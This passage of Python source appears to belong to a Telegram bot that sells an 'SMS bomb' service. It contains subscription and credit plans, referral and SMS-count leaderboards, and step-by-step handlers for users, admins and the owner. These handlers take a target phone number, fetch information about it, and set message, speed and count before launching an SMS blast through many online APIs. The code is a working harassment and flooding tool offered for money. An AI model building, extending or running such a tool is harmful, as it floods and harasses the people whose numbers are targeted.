            f"💰 Credits Low: {'🟢 ON' if prefs.get('credits_low', True) else '🔴 OFF'}\n"
            f"🎫 Validity Expiring: {'🟢 ON' if prefs.get('validity_expiring', True) else '🔴 OFF'}\n"
            f"🆕 New Features: {'🟢 ON' if prefs.get('new_feature', True) else '🔴 OFF'}\n"
            f"📢 Broadcast: {'🟢 ON' if prefs.get('broadcast', True) else '🔴 OFF'}\n"
            f"📣 Marketing: {'🟢 ON' if prefs.get('marketing', False) else '🔴 OFF'}\n")
    rows = [
        [btn(f"💰 ᴄʀᴇᴅɪᴛs ʟᴏᴡ", f"user:notif:toggle:credits_low", EMOJI_MONEY, "💰")],
        [btn(f"🎫 ᴠᴀʟɪᴅɪᴛʏ ᴇxᴘ", f"user:notif:toggle:validity_expiring", EMOJI_CHECK, "🎫")],
        [btn(f"🆕 ɴᴇᴡ ғᴇᴀᴛᴜʀᴇs", f"user:notif:toggle:new_feature", EMOJI_GIFT, "🆕")],
        [btn(f"📢 ʙʀᴏᴀᴅᴄᴀsᴛ", f"user:notif:toggle:broadcast", EMOJI_BELL, "📢")],
        [btn(f"📣 ᴍᴀʀᴋᴇᴛɪɴɢ", f"user:notif:toggle:marketing", EMOJI_STAR, "📣")],
        [btn("ʙᴀᴄᴋ", "user:page:2", EMOJI_GEAR, "🔙")]
    ]
    try:
        await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
    except: pass


@R.callback_query(F.data.startswith("user:notif:toggle:"))
async def user_notif_toggle(cq: CallbackQuery, state: FSMContext):
    key = cq.data.split(":")[-1]
    d = load()
    uid = cq.from_user.id
    k = str(uid)
    if k in d.get("users", {}):
        if "notif_prefs" not in d["users"][k]:
            d["users"][k]["notif_prefs"] = {}
        current = d["users"][k]["notif_prefs"].get(key, True)
        d["users"][k]["notif_prefs"][key] = not current
        save(d)
        await cq.answer(f"✅ {'ON' if not current else 'OFF'}", show_alert=False)
    await user_notif_prefs_menu(cq, state)


# ================= MILESTONES UI =================
@R.callback_query(F.data == "user:milestones")
async def user_milestones_view(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    ref_count = d["users"].get(str(uid), {}).get("refer_count", 0)
    text = (f"🎯 <b>REFERRAL MILESTONES</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n\n"
            f"👥 Your Referrals: <b>{ref_count}</b>\n\n"
            f"<b>Milestones:</b>\n")
    for m, bonus in sorted(REFERRAL_MILESTONES.items()):
        if ref_count >= m:
            text += f"✅ {m} refers → <b>+{bonus} credits</b>\n"
        else:
            text += f"🔒 {m} refers → +{bonus} credits\n"
    try:
        await cq.message.edit_text(text, reply_markup=kb([(f"{sc('back')}", "user:page:2")]), parse_mode="HTML")
    except: pass
# =====================================================================
# PART 5 — Subscription, LB, Dashboard, Validity, Schedule, Recurring,
#          Multi-Bomb, Classic Bomb UI, SMS Send Handlers
# =====================================================================
# ⚠️ Isko PART 4 ke turant baad paste karo
# =====================================================================


# ================= SUBSCRIPTION (USER) =================
@R.callback_query(F.data == "user:subscription")
async def user_subscription_view(cq: CallbackQuery, state: FSMContext):
    d = load()
    plans = d.get("subscription", {}).get("plans", [])
    if not plans:
        plans = []
        for key, p in DEFAULT_VALIDITY_PLANS.items():
            plans.append({"id": key, "name": p["name"], "days": p["days"],
                          "price": p["price"], "currency": "INR", "payment_link": SUPER_ADMIN_LINK})
    text = f"💎 <b>SUBSCRIPTION PLANS</b>\n━━━━━━━━━━━━━━━━━━\n\nApni validity khareedo.\n<i>Credits alag se.</i>\n\n"
    for p in plans:
        text += f"💎 <b>{p['name']}</b>\n   📅 {p.get('days', 0)} days\n   💰 ₹{p.get('price', 0)}\n\n"
    rows = []
    for p in plans:
        rows.append([btn_url(f"Buy {p['name'][:18]}", p.get('payment_link', SUPER_ADMIN_LINK), EMOJI_MONEY, "💳")])
    rows.append([btn("ʙᴀᴄᴋ", "user:page:2", EMOJI_GEAR, "🔙")])
    try:
        await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
    except: pass


# ================= SUBSCRIPTION (OWNER) =================
@R.callback_query(F.data == "owner:sub:menu")
async def owner_sub_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True); return
    plans = d.get("subscription", {}).get("plans", [])
    text = f"💎 <b>Subscription Plans Manager</b>\n━━━━━━━━━━━━━━━━━━\nTotal: <b>{len(plans)}</b>\n\n"
    for p in plans:
        text += f"• <b>{p['name']}</b> — {p['days']}d — ₹{p['price']}\n"
    rows = [
        [btn("➕ ᴀᴅᴅ ᴘʟᴀɴ", "owner:sub:add", EMOJI_CHECK, "➕")],
        [btn("🗑 ʀᴇᴍᴏᴠᴇ ᴘʟᴀɴ", "owner:sub:remove", EMOJI_CROSS, "🗑")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")]
    ]
    try:
        await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
    except: pass


@R.callback_query(F.data == "owner:sub:add")
async def owner_sub_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.add_sub_plan_name)
    await cq.message.edit_text(f"💎 <b>Add Subscription Plan</b>\n\n<b>Step 1/4:</b> Plan name\n<i>Example: 15 DAY PREMIUM</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:sub:menu")]), parse_mode="HTML")


@R.message(S.add_sub_plan_name)
async def owner_sub_get_name(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    name = msg.text.strip()[:40]
    await state.update_data(sub_name=name)
    await state.set_state(S.add_sub_plan_days)
    await msg.answer(f"✅ <b>{name}</b>\n\n<b>Step 2/4:</b> Days?\n<i>Example: 15</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:sub:menu")]), parse_mode="HTML")


@R.message(S.add_sub_plan_days)
async def owner_sub_get_days(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    try:
        days = int(msg.text.strip())
        if days < 1: raise ValueError
    except:
        await msg.answer("❌ Valid days.", parse_mode="HTML"); return
    await state.update_data(sub_days=days)
    await state.set_state(S.add_sub_plan_price)
    await msg.answer(f"✅ Days: <b>{days}</b>\n\n<b>Step 3/4:</b> Price (INR)?",
        reply_markup=kb([(f"{sc('cancel')}", "owner:sub:menu")]), parse_mode="HTML")


@R.message(S.add_sub_plan_price)
async def owner_sub_get_price(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    try:
        price = float(msg.text.strip())
        if price < 0: raise ValueError
    except:
        await msg.answer("❌ Valid price.", parse_mode="HTML"); return
    await state.update_data(sub_price=price)
    await state.set_state(S.add_sub_plan_link)
    await msg.answer(f"✅ ₹{price}\n\n<b>Step 4/4:</b> Payment link",
        reply_markup=kb([(f"{sc('cancel')}", "owner:sub:menu")]), parse_mode="HTML")


@R.message(S.add_sub_plan_link)
async def owner_sub_get_link(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    link = msg.text.strip()
    if not link.startswith("http"):
        await msg.answer("❌ URL bhejo.", parse_mode="HTML"); return
    fsmd = await state.get_data()
    plan = {"id": str(int(time.time())), "name": fsmd.get("sub_name", "Plan"),
            "days": fsmd.get("sub_days", 30), "price": fsmd.get("sub_price", 0),
            "currency": "INR", "payment_link": link}
    d.setdefault("subscription", {}).setdefault("plans", []).append(plan)
    save(d)
    await state.clear()
    await msg.answer(f"✅ <b>Plan Added!</b>\n\n💎 {plan['name']}\n📅 {plan['days']} days\n💰 ₹{plan['price']}",
        reply_markup=kb([(f"{sc('back')}", "owner:sub:menu")]), parse_mode="HTML")


@R.callback_query(F.data == "owner:sub:remove")
async def owner_sub_remove_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    plans = d.get("subscription", {}).get("plans", [])
    if not plans:
        await cq.answer("❌ No plans!", show_alert=True); return
    rows = []
    for p in plans:
        rows.append([btn(f"🗑 {p['name'][:20]} ({p['days']}d)", f"owner:sub:del:{p['id']}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:sub:menu", EMOJI_GEAR, "🔙")])
    try:
        await cq.message.edit_text(f"🗑 <b>Remove Plan</b>",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
    except: pass


@R.callback_query(F.data.startswith("owner:sub:del:"))
async def owner_sub_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    pid = cq.data.split(":")[-1]
    d["subscription"]["plans"] = [p for p in d["subscription"].get("plans", []) if p["id"] != pid]
    save(d)
    await cq.answer("🗑", show_alert=True)
    await owner_sub_menu(cq, state)


# ================= LEADERBOARDS =================
@R.callback_query(F.data.in_({"owner:ref_leaderboard", "admin:ref_leaderboard", "user:ref_leaderboard"}))
async def ref_leaderboard_view(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    lb = get_referral_leaderboard(d, 10)
    if not lb or all(x[2] == 0 for x in lb):
        await cq.answer("❌ Koi referrals nahi!", show_alert=True); return
    lines = [f"🎁 <b>REFERRAL LEADERBOARD — TOP 10</b>\n", "━━━━━━━━━━━━━━━━━━"]
    medals = ["🥇", "🥈", "🥉"]
    for i, (u_id, name, refs) in enumerate(lb, 1):
        if refs == 0: continue
        medal = medals[i-1] if i <= 3 else f"{i}."
        highlight = " ◀ ʏᴏᴜ" if u_id == uid else ""
        lines.append(f"{medal} <b>{name[:18]}</b> — {refs} ʀᴇғs{highlight}")
    lines.append("━━━━━━━━━━━━━━━━━━")
    if is_owner(uid, d): back = "owner:home"
    elif is_admin(uid, d): back = "admin:home"
    else: back = "user:page:2"
    try:
        await cq.message.edit_text("\n".join(lines), reply_markup=kb([(f"{sc('back')}", back)]), parse_mode="HTML")
    except TelegramBadRequest: pass
    await cq.answer()


@R.callback_query(F.data.in_({"owner:leaderboard", "admin:leaderboard", "user:leaderboard"}))
async def leaderboard_view(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    lb = get_leaderboard(d, 10)
    if not lb:
        await cq.answer("❌ No users yet!", show_alert=True); return
    lines = [f"🏆 <b>SMS LEADERBOARD — TOP 10</b>\n", "━━━━━━━━━━━━━━━━━━"]
    medals = ["🥇", "🥈", "🥉"]
    for i, (u_id, name, uses) in enumerate(lb, 1):
        medal = medals[i-1] if i <= 3 else f"{i}."
        highlight = " ◀ ʏᴏᴜ" if u_id == uid else ""
        lines.append(f"{medal} <b>{name[:18]}</b> — {uses} sᴍs{highlight}")
    lines.append("━━━━━━━━━━━━━━━━━━")
    if is_owner(uid, d): back = "owner:home"
    elif is_admin(uid, d): back = "admin:home"
    else: back = "user:page:2"
    try:
        await cq.message.edit_text("\n".join(lines), reply_markup=kb([(f"{sc('back')}", back)]), parse_mode="HTML")
    except TelegramBadRequest: pass
    await cq.answer()


# ================= LIVE DASHBOARD =================
@R.callback_query(F.data == "owner:dashboard")
async def owner_dashboard(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True); return
    text = get_live_dashboard(d)
    try:
        await cq.message.edit_text(text,
            reply_markup=kb([(f"{sc('refresh')}", "owner:dashboard"), (f"{sc('back')}", "owner:home")]),
            parse_mode="HTML")
    except: pass
    await cq.answer()


# ================= VALIDITY MANAGER (OWNER) =================
@R.callback_query(F.data == "owner:validity:menu")
async def owner_validity_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True); return
    text = f"🎫 <b>VALIDITY MANAGER</b>\n━━━━━━━━━━━━━━━━━━\nUser ko plan validity assign karein.\n\n<b>Available Plans:</b>\n"
    for key, p in DEFAULT_VALIDITY_PLANS.items():
        text += f"  {p['emoji']} <b>{p['name']}</b> — {p['days']} days\n"
    rows = [
        [btn("ᴀssɪɢɴ ᴠᴀʟɪᴅɪᴛʏ", "owner:validity:assign", EMOJI_CHECK, "🎫")],
        [btn("ʀᴇᴍᴏᴠᴇ ᴠᴀʟɪᴅɪᴛʏ", "owner:validity:remove", EMOJI_CROSS, "🗑")],
        [btn("ᴠɪᴇᴡ ᴠᴀʟɪᴅ ᴜsᴇʀs", "owner:validity:list", EMOJI_STAR, "📋")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")]]
    try:
        await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
    except: pass


@R.callback_query(F.data == "owner:validity:assign")
async def owner_validity_assign_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.validity_uid)
    await cq.message.edit_text(f"🎫 <b>Assign Validity</b>\n\n<b>Step 1/2:</b> User ID\n<i>Example: 6906353235</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:validity:menu")]), parse_mode="HTML")


@R.message(S.validity_uid)
async def owner_validity_get_uid(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    try:
        uid = int(msg.text.strip())
    except:
        await msg.answer("❌ Valid ID bhejo.", parse_mode="HTML"); return
    if str(uid) not in d.get("users", {}):
        await msg.answer(f"❌ User {uid} register nahi hai.", parse_mode="HTML"); return
    await state.update_data(validity_target_uid=uid)
    rows = []
    for key, p in DEFAULT_VALIDITY_PLANS.items():
        rows.append([btn(f"{p['name']} ({p['days']}ᴅ)", f"owner:validity:plan:{uid}:{key}", EMOJI_CHECK, p['emoji'])])
    rows.append([btn("ᴄᴀɴᴄᴇʟ", "owner:validity:menu", EMOJI_CROSS, "❌")])
    await msg.answer(f"🎫 <b>Step 2/2: Select Plan</b>\n\n👤 <code>{uid}</code>\nNaam: {get_display_name(uid, d)}",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")


@R.callback_query(F.data.startswith("owner:validity:plan:"))
async def owner_validity_assign_plan(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    parts = cq.data.split(":")
    try:
        uid = int(parts[3]); plan_key = parts[4]
    except:
        await cq.answer("❌ Error", show_alert=True); return
    if plan_key not in DEFAULT_VALIDITY_PLANS:
        await cq.answer("❌ Invalid plan", show_alert=True); return
    plan = DEFAULT_VALIDITY_PLANS[plan_key]
    new_until = set_validity(uid, plan["days"], plan["name"], d)
    save(d)
    try:
        await cq.bot.send_message(uid,
            f"🎉 <b>Validity Activated!</b>\n\n{plan['emoji']} Plan: <b>{plan['name']}</b>\n"
            f"📅 Duration: <b>{plan['days']} days</b>\n"
            f"⏰ Expires: <code>{fmt_time(new_until)}</code>\n\n"
            f"⭐ <b>Ab aapko SMS/Classic/Multi bomb me credits nahi lagenge!</b>",
            parse_mode="HTML")
    except: pass
    await state.clear()
    await cq.answer(f"✅ {plan['name']} assigned!", show_alert=True)
    try:
        await cq.message.edit_text(
            f"✅ <b>Validity Assigned!</b>\n\n👤 <code>{uid}</code>\n{plan['emoji']} <b>{plan['name']}</b>\n"
            f"⏰ Until: <code>{fmt_time(new_until)}</code>",
            reply_markup=kb([(f"{sc('back')}", "owner:validity:menu")]), parse_mode="HTML")
    except: pass


@R.callback_query(F.data == "owner:validity:remove")
async def owner_validity_remove_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    valid_users = []
    for uid_str, u in d.get("users", {}).items():
        try:
            v = get_validity_info(int(uid_str), d)
            if v["has_validity"]:
                valid_users.append((int(uid_str), get_display_name(int(uid_str), d), v))
        except: pass
    if not valid_users:
        await cq.answer("❌ Koi valid user nahi!", show_alert=True); return
    rows = []
    for uid, name, v in valid_users[:15]:
        tag = "⏰" if v["is_expired"] else "✅"
        rows.append([btn(f"{tag} {name[:15]} ({v['plan_name']})", f"owner:validity:rm:{uid}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:validity:menu", EMOJI_GEAR, "🔙")])
    try:
        await cq.message.edit_text(f"🗑 <b>Remove Validity</b>",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
    except: pass


@R.callback_query(F.data.startswith("owner:validity:rm:"))
async def owner_validity_remove_do(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    uid = int(cq.data.split(":")[-1])
    remove_validity(uid, d)
    save(d)
    await cq.answer("✅ Removed!", show_alert=True)
    try:
        await cq.bot.send_message(uid, f"⚠️ Aapki validity hata di gayi.", parse_mode="HTML")
    except: pass
    await owner_validity_menu(cq, state)


@R.callback_query(F.data == "owner:validity:list")
async def owner_validity_list(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    valid_users = []
    for uid_str, u in d.get("users", {}).items():
        try:
            v = get_validity_info(int(uid_str), d)
            if v["has_validity"]:
                valid_users.append((int(uid_str), get_display_name(int(uid_str), d), v))
        except: pass
    if not valid_users:
        try:
            await cq.message.edit_text(f"📋 <b>Valid Users</b>\n\n❌ Koi nahi.",
                reply_markup=kb([(f"{sc('back')}", "owner:validity:menu")]), parse_mode="HTML")
        except: pass
        return
    valid_users.sort(key=lambda x: x[2]["until"])
    lines = [f"📋 <b>VALID USERS ({len(valid_users)})</b>\n"]
    for uid, name, v in valid_users[:30]:
        if v["is_expired"]: tag = "⏰ ᴇxᴘɪʀᴇᴅ"
        elif v["days_left"] >= 1: tag = f"✅ {v['days_left']}ᴅ ʟᴇғᴛ"
        else: tag = f"⏳ {v['hours_left']}ʜ ʟᴇғᴛ"
        lines.append(f"• <code>{uid}</code> {name[:15]} — {v['plan_name']} — {tag}")
    try:
        await cq.message.edit_text("\n".join(lines), reply_markup=kb([(f"{sc('back')}", "owner:validity:menu")]), parse_mode="HTML")
    except: pass


# ================= USER VALIDITY =================
@R.callback_query(F.data == "user:validity")
async def user_validity_view(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    v = get_validity_info(uid, d)
    if not v["has_validity"]:
        text = (f"🎫 <b>MY VALIDITY</b>\n\n❌ <b>No active plan</b>\n\n"
                f"Owner: {SUPER_ADMIN_NAME}\nYa 💎 <b>Buy Plan</b> use karein.")
    elif v["is_expired"]:
        text = (f"🎫 <b>MY VALIDITY</b>\n\n⏰ <b>EXPIRED</b>\n📋 {v['plan_name']}\n"
                f"📅 {fmt_time(v['until'])}\n\nRenew karein!")
    else:
        pct = get_validity_percent(uid, d)
        bar = validity_progress_bar(100 - pct)
        text = (f"🎫 <b>MY VALIDITY</b>\n\n✅ <b>ACTIVE</b>\n📋 <b>{v['plan_name']}</b>\n"
                f"⏰ Expires: <code>{fmt_time(v['until'])}</code>\n"
                f"📅 Days: <b>{v['days_left']}</b>\n🕐 Hours: <b>{v['hours_left']}</b>\n\n"
                f"📊 <b>Progress:</b>\n<code>{bar}</code> <b>{100-pct}% remaining</b>\n\n"
                f"⭐ <b>Aapko credits nahi lagte — free bomb!</b>")
    try:
        await cq.message.edit_text(text, reply_markup=kb([(f"{sc('back')}", "user:page:1")]), parse_mode="HTML")
    except: pass
    await cq.answer()


# ================= USER SEND (SMS) — WITH NUMBER INFO =================
@R.callback_query(F.data == "user:send")
async def user_send_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    joined, missing = await user_joined_all(cq.bot, uid, d)
    if not joined:
        await cq.answer("⛔ Force Join!", show_alert=True)
        try:
            await cq.message.edit_text(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        except: pass
        return
    if not can_use(uid, d):
        await cq.answer("🚫 Access denied!", show_alert=True); return
    await state.set_state(S.send_number)
    try:
        await cq.message.edit_text(
            f"📞 <b>{sc('step 1/4')} — {sc('number')}</b>\n\n"
            f"Target number enter karo:\n<i>Example: +919876543210</i>",
            reply_markup=kb([(f"{sc('cancel')}", "user:home")]),
            parse_mode="HTML")
    except: pass


@R.message(S.send_number)
async def user_got_number(msg: Message, state: FSMContext):
    raw = msg.text.strip()
    number = extract_indian_number(raw)

    if not number:
        await msg.answer(
            f"❌ <b>Invalid number!</b>\n\n"
            f"Aapne bheja: <code>{raw[:30]}</code>\n\n"
            f"<b>Valid formats:</b>\n"
            f"• <code>9876543210</code>\n"
            f"• <code>+919876543210</code>\n"
            f"• <code>+91 98765 43210</code>\n"
            f"• <code>09876543210</code>\n\n"
            f"Dobara bhejo:",
            parse_mode="HTML"
        )
        return

    if number in PROTECTED_NUMBERS:
        await msg.answer(f"🔒 Ye number protected hai!", parse_mode="HTML")
        return

    loading_msg = await msg.answer(
        f"🔍 <b>Number check kar raha hoon...</b>\n\n"
        f"📞 <code>{mask_number(number)}</code>\n"
        f"<i>Please wait...</i>",
        parse_mode="HTML"
    )

    info = await fetch_number_info(number)

    try:
        await loading_msg.delete()
    except:
        pass

    if not info:
        await state.update_data(number=number)
        await state.set_state(S.send_message)
        await msg.answer(
            f"✅ Number: <code>{mask_number(number)}</code>\n\n"
            f"⚠️ <i>Info fetch nahi hui, aage badh raha hoon...</i>\n\n"
            f"💬 <b>{sc('step 2/4')} — {sc('message')}</b>\n\nMessage type karo:",
            reply_markup=kb([(f"{sc('cancel')}", "user:cancel")]),
            parse_mode="HTML"
        )
        return

    await state.update_data(number=number, num_info_shown_at=time.time())
    await state.set_state(S.send_number)

    info_msg = await msg.answer(
        format_number_info(number, info),
        reply_markup=num_info_kb(number),
        parse_mode="HTML"
    )

    asyncio.create_task(auto_delete_num_info(msg.bot, msg.chat.id, info_msg.message_id, NUM_INFO_AUTO_DELETE_SECONDS))


@R.message(S.send_message)
async def user_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=msg.text.strip())
    await state.set_state(S.send_speed)
    await msg.answer(
        f"✅ Saved!\n\n⚡ <b>{sc('step 3/4')} — {sc('speed')}</b>",
        reply_markup=speed_kb("user"),
        parse_mode="HTML"
    )


@R.callback_query(F.data.in_({"user:speed:fast", "user:speed:medium", "user:speed:slow"}))
async def user_speed_selected(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    speed_map = {"user:speed:fast": SPEED_FAST, "user:speed:medium": SPEED_MEDIUM, "user:speed:slow": SPEED_SLOW}
    selected_speed = speed_map.get(cq.data, SPEED_MEDIUM)
    speed_label = "🚀 FAST" if selected_speed == SPEED_FAST else "⚡ MEDIUM" if selected_speed == SPEED_MEDIUM else "🐢 SLOW"
    await state.update_data(send_speed=selected_speed)
    await state.set_state(S.send_count)
    devices = get_cached_devices() or await get_all_online_devices(d)
    count = len(devices)
    deduct = should_deduct_credits(uid, d)
    if deduct:
        credit_info = f"\n💰 Credits: <b>{get_user_credits(uid, d)}</b>"
    else:
        if has_active_validity(uid, d):
            v = get_validity_info(uid, d)
            credit_info = f"\n🎫 <b>{v['plan_name']}</b> • {v['days_left']}d — No deduction ✅"
        else:
            credit_info = f"\n💰 Admin/Owner: No deduction"
    try:
        await cq.message.edit_text(
            f"{speed_label} <b>selected!</b>\n\n"
            f"📊 <b>{sc('step 4/4')} — {sc('count')}</b>\n\n"
            f"🔥 Online APIs: <b>{count}</b>\n{credit_info}\n\nKitne SMS?",
            reply_markup=kb([(f"{sc('cancel')}", "user:cancel")]),
            parse_mode="HTML")
    except: pass


@R.message(S.send_count)
async def user_got_count(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    fsmd = await state.get_data()
    try:
        count = int(msg.text.strip())
        if count < 1: raise ValueError
    except:
        await msg.answer(f"❌ Sirf number bhejo:", parse_mode="HTML"); return
    await state.clear()
    number = fsmd.get("number", "")
    message_text = fsmd.get("message", "")
    send_speed = fsmd.get("send_speed", SPEED_DEFAULT)
    deduct = should_deduct_credits(uid, d)
    if deduct:
        cc = get_user_credits(uid, d)
        if cc <= 0:
            await msg.answer(
                f"❌ Credits nahi hain!\n\n💡 *Validity lo → credits free!*\nOwner: {SUPER_ADMIN_NAME}",
                reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML")
            return
        if count > cc:
            await msg.answer(f"⚠️ Sirf {cc} credits hain! {cc} bhej raha hoon...", parse_mode="HTML")
            count = cc
    devices = get_cached_devices() or await get_all_online_devices(d)
    if not devices:
        await msg.answer(f"😴 Koi API online nahi!", reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML")
        return
    await run_sms_blast_with_progress(msg.bot, msg, uid, number, message_text, count, devices, send_speed)


# ================= OWNER SEND =================
@R.callback_query(F.data == "owner:send")
async def owner_send_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True); return
    await state.set_state(S.owner_send_number)
    try:
        await cq.message.edit_text(f"👑 <b>Owner SMS Send</b>\n\n📞 Target number:",
            reply_markup=kb([(f"{sc('cancel')}", "owner:home")]), parse_mode="HTML")
    except: pass


@R.message(S.owner_send_number)
async def owner_got_number(msg: Message, state: FSMContext):
    number = extract_indian_number(msg.text.strip())
    if not number:
        await msg.answer(f"❌ Invalid number.", parse_mode="HTML"); return
    await state.update_data(number=number)
    await state.set_state(S.owner_send_message)
    await msg.answer(f"✅ Number saved.\n\n💬 Message:", reply_markup=kb([(f"{sc('cancel')}", "owner:home")]), parse_mode="HTML")


@R.message(S.owner_send_message)
async def owner_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=msg.text.strip())
    await state.set_state(S.owner_send_speed)
    await msg.answer(f"✅\n\n⚡ Speed:", reply_markup=speed_kb("owner"), parse_mode="HTML")


@R.callback_query(F.data.in_({"owner:speed:fast", "owner:speed:medium", "owner:speed:slow"}))
async def owner_speed_selected(cq: CallbackQuery, state: FSMContext):
    speed_map = {"owner:speed:fast": SPEED_FAST, "owner:speed:medium": SPEED_MEDIUM, "owner:speed:slow": SPEED_SLOW}
    selected_speed = speed_map.get(cq.data, SPEED_MEDIUM)
    await state.update_data(send_speed=selected_speed)
    await state.set_state(S.owner_send_count)
    devices = get_cached_devices() or await get_all_online_devices(load())
    try:
        await cq.message.edit_text(f"📊 Online APIs: <b>{len(devices)}</b>\n\nKitne SMS?",
            reply_markup=kb([(f"{sc('cancel')}", "owner:home")]), parse_mode="HTML")
    except: pass


@R.message(S.owner_send_count)
async def owner_got_count(msg: Message, state: FSMContext):
    fsmd = await state.get_data()
    try:
        count = int(msg.text.strip())
    except:
        await msg.answer(f"❌ Number bhejo:", parse_mode="HTML"); return
    await state.clear()
    number = fsmd.get("number", "")
    message_text = fsmd.get("message", "")
    send_speed = fsmd.get("send_speed", SPEED_DEFAULT)
    devices = get_cached_devices() or await get_all_online_devices(load())
    if not devices:
        await msg.answer(f"😴 No API online!", reply_markup=kb([(f"{sc('owner panel')}", "owner:home")]), parse_mode="HTML")
        return
    await run_sms_blast_with_progress(msg.bot, msg, msg.from_user.id, number, message_text, count, devices, send_speed)


# ================= ADMIN SEND =================
@R.callback_query(F.data == "admin:send")
async def admin_send_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Admin only!", show_alert=True); return
    await state.set_state(S.admin_send_number)
    try:
        await cq.message.edit_text(f"🛡 <b>Admin SMS Send</b>\n\n📞 Target number:",
            reply_markup=kb([(f"{sc('cancel')}", "admin:home")]), parse_mode="HTML")
    except: pass


@R.message(S.admin_send_number)
async def admin_got_number(msg: Message, state: FSMContext):
    number = extract_indian_number(msg.text.strip())
    if not number:
        await msg.answer(f"❌ Invalid.", parse_mode="HTML"); return
    if number in PROTECTED_NUMBERS and not is_owner(msg.from_user.id, load()):
        await msg.answer(f"🔒 Protected number!", parse_mode="HTML"); return
    await state.update_data(number=number)
    await state.set_state(S.admin_send_message)
    await msg.answer(f"✅\n\n💬 Message:", reply_markup=kb([(f"{sc('cancel')}", "admin:home")]), parse_mode="HTML")


@R.message(S.admin_send_message)
async def admin_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=msg.text.strip())
    await state.set_state(S.admin_send_speed)
    await msg.answer(f"✅\n\n⚡ Speed:", reply_markup=speed_kb("admin"), parse_mode="HTML")


@R.callback_query(F.data.in_({"admin:speed:fast", "admin:speed:medium", "admin:speed:slow"}))
async def admin_speed_selected(cq: CallbackQuery, state: FSMContext):
    speed_map = {"admin:speed:fast": SPEED_FAST, "admin:speed:medium": SPEED_MEDIUM, "admin:speed:slow": SPEED_SLOW}
    selected_speed = speed_map.get(cq.data, SPEED_MEDIUM)
    await state.update_data(send_speed=selected_speed)
    await state.set_state(S.admin_send_count)
    devices = get_cached_devices() or await get_all_online_devices(load())
    try:
        await cq.message.edit_text(f"📊 Online APIs: <b>{len(devices)}</b>\n\nKitne SMS?",
            reply_markup=kb([(f"{sc('cancel')}", "admin:home")]), parse_mode="HTML")
    except: pass


@R.message(S.admin_send_count)
async def admin_got_count(msg: Message, state: FSMContext):
    fsmd = await state.get_data()
    try:
        count = int(msg.text.strip())
    except:
